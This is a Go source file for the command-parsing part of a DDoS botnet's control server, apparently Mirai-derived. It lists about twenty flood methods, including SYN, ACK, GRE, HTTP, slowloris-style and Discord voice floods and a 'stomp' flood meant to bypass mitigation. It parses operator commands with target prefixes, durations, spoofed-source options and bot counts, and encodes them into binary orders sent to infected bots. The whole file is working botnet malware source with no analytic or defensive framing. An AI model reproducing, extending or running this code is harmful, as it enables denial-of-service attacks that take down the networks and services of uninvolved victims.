package main

import (
    "fmt"
    "strings"
    "strconv"
    "net"
    "encoding/binary"
    "errors"
    "github.com/mattn/go-shellwords"
)

type AttackInfo struct {
    attackID            uint8
    attackFlags         []uint8
    attackDescription   string
}

type Attack struct {
    Duration    uint32
    Type        uint8
    Targets     map[uint32]uint8    // Prefix/netmask
    Flags       map[uint8]string    // key=value
}

type FlagInfo struct {
    flagID          uint8
    flagDescription string
}

var flagInfoLookup = map[string]FlagInfo{
    "payload": {
        0,
        "Size of packet data, default is 512 bytes",
    },
    "size": {
        0,
        "Size of packet data, default is 512 bytes",
    },
    "len": {
        0,
        "Size of packet data, default is 512 bytes",
    },
    "rand": {
        1,
        "Randomize packet data content, default is 1 (yes)",
    },
    "tos": {
        2,
        "TOS field value in IP header, default is 0",
    },
    "ident": {
        3,
        "ID field value in IP header, default is random",
    },
    "ttl": {
        4,
        "TTL field in IP header, default is 255",
    },
    "df": {
        5,
        "Set the Dont-Fragment bit in IP header, default is 0 (no)",
    },
    "sport": {
        6,
        "Source port, default is random",
    },
    "dport": {
        7,
        "Destination port, default is random",
    },
    "port": {
        7,
        "Destination port, default is random",
    },
    "domain": {
        8,
        "Domain name to attack",
    },
    "dhid": {
        9,
        "Domain name transaction ID, default is random",
    },
    "urg": {
        11,
        "Set the URG bit in TCP header, default is 0 (no)",
    },
    "ack": {
        12,
        "Set the ACK bit in TCP header, default is 0 (no) except for ACK flood",
    },
    "psh": {
        13,
        "Set the PSH bit in TCP header, default is 0 (no)",
    },
    "rst": {
        14,
        "Set the RST bit in TCP header, default is 0 (no)",
    },
    "syn": {
        15,
        "Set the SYN bit in TCP header, default is 0 (no) except for SYN flood",
    },
    "fin": {
        16,
        "Set the FIN bit in TCP header, default is 0 (no)",
    },
    "seqrnd": {
        17,
        "Sequence number value in TCP header, default is random",
    },
    "ackrnd": {
        18,
        "Ack number value in TCP header, default is random",
    },
    "gcip": {
        19,
        "Set internal IP to destination IP, default is 0 (no)",
    },
    "method": {
        20,
        "HTTP method name, default is GET",
    },
    "postdata": {
        21,
        "POST data, default is empty/none",
    },
    "path": {
        22,
        "HTTP path, default is /",
    },
    "https": {
        23,
        "Is this URL SSL/HTTPS?, default is 0 (no)",
    },
    "conns": {
        24,
        "Number of connections",
    },
    "source": {
        25,
        "Source IP address, 255.255.255.255 for random",
    },
    "minlen": {
        26,
        "Minimum packet length",
    },
    "maxlen": {
        27,
        "Maximum packet length",
    },
    "payload_one": {
        28,
        "Custom payload",
    },
    "repeat": {
        29,
        "Number of times to repeat",
    },
    "timeout": {
        30,
        "socket timeout (in ms)",
    },
    "ratelimit": {
        31,
        "ratelimit between packets (in ms)",
    },
    "packets_per_cycle": {
        32,
        "Number of packets to send per cycle",
    },
}

var attackInfoLookup = map[string]AttackInfo{
    "udp": {
        0,
        []uint8{0, 1, 7},
        "UDP Flooding, DGRAM UDP with less PPS Speed",
    },
    "stomp": {
        1,
        []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16},
        "stomp/handshake flood to bypass mitigation devices",
    },
    "tcp": {
        2,
        []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
        "TCP flood (urg,ack,syn)",
    },
    "ack": {
        3,
        []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
        "ACK flood optimized for higher GBPS",
    },
    "syn": {
        4,
        []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
        "SYN flood optimized for higher GBPS",
    },
    "stdhex": {
        5,
        []uint8{0, 6, 7},
        "STDHEX flood",
    },
    "nudp": {
        6,
        []uint8{0, 6, 7},
        "NUDP flood",
    },
    "udphex": {
        7,
        []uint8{0, 1, 6, 7},
        "UDPHEX flood",
    },
    "tcpxmas": {
        8,
        []uint8{0, 1, 2, 3, 4, 5, 6, 7, 25},
        "Xmas tcp flood",
    },
    "socket": {
        9,
        []uint8{7, 24},
        "Socket spamming",
    },
    "portstuff": {
        10,
        []uint8{7, 24},
        "Slow TCP connection spam (slowloris-style)",
    },
    "rapidsocket": {
        11,
        []uint8{7, 24, 30},
        "Fast socket spam with low timeout and immediate close",
    },
    "stop": {
        12,
        []uint8{},
        "Stop your ongoing attacks",
    },
    "discord": {
        13,
        []uint8{0, 7},
        "Discord flood targeting voice servers with crafted RTP packets, default size=160 bytes",
    },
    "tcpbypass": {
        14,
        []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 25},
        "TCP flood with randomized flags and payload",
    },
    "icmp": {
        15,
        []uint8{0, 2, 3, 4, 5, 24, 25},
        "ICMP echo request flood",
    },
    "greip": {
        16,
        []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
        "GRE IP flood with encapsulated UDP packets",
    },
    "greeth": {
        17,
        []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
        "GRE Ethernet flood with encapsulated UDP packets over Ethernet",
    },
    "http": {
        18,
        []uint8{0, 7, 8, 20, 21, 22, 24, 25, 30},
        "HTTP flood targeting web servers",
    },
    "home": {
        19,
        []uint8{0, 1, 6, 7, 29, 31, 32},
        "UDP flood optimized for home networks, high PPS with rate limiting",
    },
}

func uint8InSlice(a uint8, list []uint8) bool {
    for _, b := range list {
        if b == a {
            return true
        }
    }
    return false
}

func NewAttack(str string, isAdmin bool) (*Attack, int, error) {
    atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
    args, _ := shellwords.Parse(str)
    var botCount int = -1

    var atkInfo AttackInfo
    // Parse attack name
    if len(args) == 0 {
        return nil, 0, errors.New("\x1b[31mMust specify an attack name\x1b[0m")
    } else {
        if args[0] == "?" {
            validCmdList := "\x1b[38;5;135mAvailable methods:\r\n\x1b[38;5;231m"
            for cmdName, atkInfo := range attackInfoLookup {
                validCmdList += fmt.Sprintf("\x1b[38;5;135m%s\x1b[38;5;231m: %s\r\n", cmdName, atkInfo.attackDescription)
            }
            return nil, 0, errors.New(validCmdList)
        }
        methodName := args[0]
        var exists bool
        atkInfo, exists = attackInfoLookup[methodName]
        if !exists {
            return nil, 0, errors.New(fmt.Sprintf("\x1b[38;5;90m%s \x1b[31mis not a valid command!\x1b[0m", methodName))
        }
        atk.Type = atkInfo.attackID

        args = args[1:]

        // Check if the user is requesting flag information with "method ?"
        if len(args) > 0 && args[0] == "?" {
            validFlags := fmt.Sprintf("\x1b[38;5;135mFlags for %s:\r\n\r\n\x1b[38;5;231m", methodName)
            for _, flagID := range atkInfo.attackFlags {
                for flagName, flagInfo := range flagInfoLookup {
                    if flagID == flagInfo.flagID {
                        validFlags += fmt.Sprintf("\x1b[38;5;135m%s\x1b[38;5;231m: %s\r\n", flagName, flagInfo.flagDescription)
                        break
                    }
                }
            }
            return nil, 0, errors.New(validFlags)
        }

        // Special handling for stop command
        if atk.Type == 12 { // ATK_VEC_STOP is 12
            atk.Duration = 1
            atk.Targets[0] = 0 // Dummy target: 0.0.0.0/0
            return atk, botCount, nil
        }
    }

    // Parse targets
    if len(args) == 0 {
        return nil, 0, errors.New("\x1b[31mMust specify prefix/netmask as targets\x1b[0m")
    } else {
        if args[0] == "?" {
            return nil, 0, errors.New("\x1b[38;5;231mComma delimited list of target prefixes\r\nEx: \x1b[38;5;27m192.168.0.1\r\n\x1b[38;5;231mEx: \x1b[38;5;27m10.0.0.0/8\r\n\x1b[38;5;231mEx: \x1b[38;5;27m8.8.8.8,127.0.0.0/29\x1b[0m")
        }
        cidrArgs := strings.Split(args[0], ",")
        if len(cidrArgs) > 255 {
            return nil, 0, errors.New("\x1b[31mCannot specify more than 255 targets in a single attack!\x1b[0m")
        }
        for _, cidr := range cidrArgs {
            prefix := ""
            netmask := uint8(32)
            cidrInfo := strings.Split(cidr, "/")
            if len(cidrInfo) == 0 {
                return nil, 0, errors.New("\x1b[31mBlank target specified!\x1b[0m")
            }
            prefix = cidrInfo[0]
            if len(cidrInfo) == 2 {
                netmaskTmp, err := strconv.Atoi(cidrInfo[1])
                if err != nil || netmask > 32 || netmask < 0 {
                    return nil, 0, errors.New(fmt.Sprintf("\x1b[31mInvalid netmask was supplied, near %s\x1b[0m", cidr))
                }
                netmask = uint8(netmaskTmp)
            } else if len(cidrInfo) > 2 {
                return nil, 0, errors.New(fmt.Sprintf("\x1b[31mToo many /'s in prefix, near %s\x1b[0m", cidr))
            }

            ip := net.ParseIP(prefix)
            if ip == nil {
                return nil, 0, errors.New(fmt.Sprintf("\x1b[31mFailed to parse IP address, near %s\x1b[0m", cidr))
            }
            atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
        }
        args = args[1:]
    }

    // Parse attack duration time
    if len(args) == 0 {
        return nil, 0, errors.New("\x1b[31mMust specify an attack duration\x1b[0m")
    } else {
        if args[0] == "?" {
            return nil, 0, errors.New("\x1b[38;5;231mDuration of the attack, in seconds\x1b[0m")
        }
        duration, err := strconv.Atoi(args[0])
        if err != nil || duration == 0 || duration > 21600 {
            return nil, 0, errors.New(fmt.Sprintf("\x1b[31mInvalid attack duration, near %s. Duration must be between 0 and 21600 seconds\x1b[0m", args[0]))
        }
        atk.Duration = uint32(duration)
        args = args[1:]
    }

    // Parse flags
    for len(args) > 0 {
        if args[0] == "?" {
            validFlags := "\x1b[38;5;135mList of flags key=val separated by spaces. Valid flags for this method are\r\n\r\n\x1b[38;5;231m"
            for _, flagID := range atkInfo.attackFlags {
                for flagName, flagInfo := range flagInfoLookup {
                    if flagID == flagInfo.flagID {
                        validFlags += fmt.Sprintf("\x1b[38;5;135m%s\x1b[38;5;231m: %s\r\n", flagName, flagInfo.flagDescription)
                        break
                    }
                }
            }
            validFlags += "\x1b[38;5;135mbots\x1b[38;5;231m: Number of bots to use for the attack\r\n"
            validFlags += "\r\n\x1b[38;5;231mValue of \x1b[38;5;27m65535\x1b[38;5;231m for a flag denotes random (for ports, etc)\r\n"
            validFlags += "\x1b[38;5;231mEx: \x1b[38;5;27mseq=0\r\n\x1b[38;5;231mEx: \x1b[38;5;27msport=0 dport=65535\x1b[0m"
            return nil, 0, errors.New(validFlags)
        }
        flagSplit := strings.SplitN(args[0], "=", 2)
        if len(flagSplit) != 2 {
            return nil, 0, errors.New(fmt.Sprintf("\x1b[31mInvalid key=value flag combination near %s\x1b[0m", args[0]))
        }
        if flagSplit[0] == "bots" {
            bots, err := strconv.Atoi(flagSplit[1])
            if err != nil || bots <= 0 {
                return nil, 0, errors.New("\x1b[31mInvalid value for bots flag, must be a positive integer\x1b[0m")
            }
            botCount = bots
        } else {
            flagInfo, exists := flagInfoLookup[flagSplit[0]]
            if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (!isAdmin && flagInfo.flagID == 25) {
                return nil, 0, errors.New(fmt.Sprintf("\x1b[31mInvalid flag key %s, near %s\x1b[0m", flagSplit[0], args[0]))
            }
            if flagSplit[1][0] == '"' {
                flagSplit[1] = flagSplit[1][1:len(flagSplit[1]) - 1]
                fmt.Println(flagSplit[1])
            }
            if flagSplit[1] == "true" {
                flagSplit[1] = "1"
            } else if flagSplit[1] == "false" {
                flagSplit[1] = "0"
            }
            atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
        }
        args = args[1:]
    }
    // Ensure default size=160 for discord attack if not specified
    if atk.Type == 13 && atk.Flags[0] == "" {
        atk.Flags[0] = "160"
    }
    
    if len(atk.Flags) > 255 {
        return nil, 0, errors.New("\x1b[31mCannot have more than 255 flags\x1b[0m")
    }

    return atk, botCount, nil
}

func (this *Attack) Build() ([]byte, error) {
    buf := make([]byte, 0)
    var tmp []byte

    // Add in attack duration
    tmp = make([]byte, 4)
    binary.BigEndian.PutUint32(tmp, this.Duration)
    buf = append(buf, tmp...)

    // Add in attack type
    buf = append(buf, byte(this.Type))

    // Send number of targets
    buf = append(buf, byte(len(this.Targets)))

    // Send targets
    for prefix,netmask := range this.Targets {
        tmp = make([]byte, 5)
        binary.BigEndian.PutUint32(tmp, prefix)
        tmp[4] = byte(netmask)
        buf = append(buf, tmp...)
    }

    // Send number of flags
    buf = append(buf, byte(len(this.Flags)))

    // Send flags
    for key,val := range this.Flags {
        tmp = make([]byte, 2)
        tmp[0] = key
        strbuf := []byte(val)
        if len(strbuf) > 255 {
            return nil, errors.New("\x1b[31mFlag value cannot be more than 255 bytes!\x1b[0m")
        }
        tmp[1] = uint8(len(strbuf))
        tmp = append(tmp, strbuf...)
        buf = append(buf, tmp...)
    }

    tmp = make([]byte, 2)
    binary.BigEndian.PutUint16(tmp, uint16(len(buf)))
    buf = append(tmp, buf...)
    if len(buf) > 8192 {
        return nil, errors.New("\x1b[31mAttack command exceeds maximum size (8192 bytes)\x1b[0m")
    }
    return buf, nil
}
